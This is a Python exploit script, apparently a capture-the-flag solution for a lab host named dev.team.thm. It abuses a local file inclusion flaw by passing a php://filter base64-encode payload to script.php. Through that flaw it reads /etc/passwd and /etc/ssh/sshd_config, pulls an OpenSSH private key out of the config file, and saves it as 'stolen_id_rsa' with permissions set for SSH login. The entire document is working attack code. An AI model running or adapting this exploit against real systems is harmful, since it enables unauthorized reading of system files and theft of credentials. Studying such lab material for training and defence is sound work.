#!/usr/bin/env python3
############################################################
# This script exploits the php://filter weakness in the
# dev.team.thm subdomain to extract an ID_RSA key from the
# sshd_config file which can then be used to SSH into the
# target machine.
#
# Note:
# For this script to work, you need to add an entry for
# dev.team.thm to your /etc/hosts file.
#
# Example entry:
# <target_ip>   dev.team.thm team.thm
############################################################

import base64
import os
import requests
import re
import stat

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_BLU = "\x1b[34;1m"
ANSI_GRN = "\x1b[32;1m"
ANSI_YLW = "\x1b[33;1m"
ANSI_RED = "\x1b[31;1m"

class puller:
    def __init__(self):
        self.base_url = "http://dev.team.thm/script.php"
        self.__target_file = "/etc/passwd"
        self.__payload = f"php://filter/convert.base64-encode/resource={self.__target_file}"
        return

    def extract_and_save(self):
        try:
            content, rsuccess, rmessage = self.extract_file_content()
            if not(rsuccess):
                raise ValueError(rmessage)
            print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] Content extracted successfully.")

            tmp_filename = self.__target_file.replace("\\","/")
            local_filename = tmp_filename.split("/")[-1]

            print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Saving content to \"{local_filename}\"", end="")
            with open(local_filename, "w") as fptr:
                fptr.write(content)

            message = f"Extracted data saved to \"{local_filename}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def extract_file_content(self):
        params = {"page":self.__payload}

        try:
            print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Extracting content ...", end="")
            resp = requests.get(self.base_url, params=params)

            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            content = base64.b64decode(resp.text.strip("\n")).decode("utf-8")
            message = "Data successfully extracted."
            success = True
        except Exception as ex:
            content = None
            message = str(ex)
            success = False

        return (content, success, message)

    def set_file(self, target_file=None):
        if (target_file is None) or not(isinstance(target_file,str)):
            target_file = "/etc/passwd"

        print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Setting target file to \"{target_file}\"", end="")
        self.__target_file = target_file
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] Target file set to \"{target_file}\"")

        self.set_payload()
        return

    def set_payload(self):
        print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Setting payload ...", end="")
        self.__payload = f"php://filter/convert.base64-encode/resource={self.__target_file}"
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] Payload set.")
        return

def extract_ssh_key(infile, outfile=None):
    try:
        if (outfile is None) or not(isinstance(outfile,str)):
            outfile = "stolen_id_rsa"

        with open(infile,"rb") as fptr:
            data = fptr.read()

        print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Searching for ID_RSA key.", end="")
        pattern = b"[-]+BEGIN OPENSSH PRIVATE KEY.*(.*\n)+.*END OPENSSH PRIVATE KEY[-]+"
        match = re.search(pattern, data)
        if match is None:
            raise ValueError("No ID_RSA info found.")
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] ID_RSA found.", end="")

        key_info = data[match.start():match.end()].decode("utf-8").replace("#","")
        key_info = f"{key_info}\n"

        print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Saving ID_RSA to \"{outfile}\"", end="")
        with open(outfile,"w") as fptr:
            fptr.write(key_info)

        message = f"ID_RSA saved to \"{outfile}\""
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)

def set_id_rsa_permissions(id_rsa_file=None):
    try:
        if (id_rsa_file is None) or not(isinstance(id_rsa_file,str)):
            id_rsa_file = "stolen_id_rsa"

        print(f"{ANSI_CLRLN}[{ANSI_BLU}*{ANSI_RST}] Setting permissions of \"{id_rsa_file}\"", end="")
        os.chmod(id_rsa_file, stat.S_IREAD|stat.S_IWRITE)

        message = f"Permissions set for \"{id_rsa_file}\""
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)

def main():
    try:
        chesty = puller()
        success, message = chesty.extract_and_save()
        if not(success):
            raise ValueError(message)
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] {message}")

        chesty.set_file(target_file="/etc/ssh/sshd_config")
        success, message = chesty.extract_and_save()
        if not(success):
            raise ValueError(message)
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] {message}")

        success, message = extract_ssh_key("sshd_config")
        if not(success):
            raise ValueError(message)
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] {message}")

        success, message = set_id_rsa_permissions()
        if not(success):
            raise ValueError(message)
        print(f"{ANSI_CLRLN}[{ANSI_YLW}+{ANSI_RST}] {message}")
    except Exception as ex:
        print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {str(ex)}")
    return

if __name__ == "__main__":
    main()

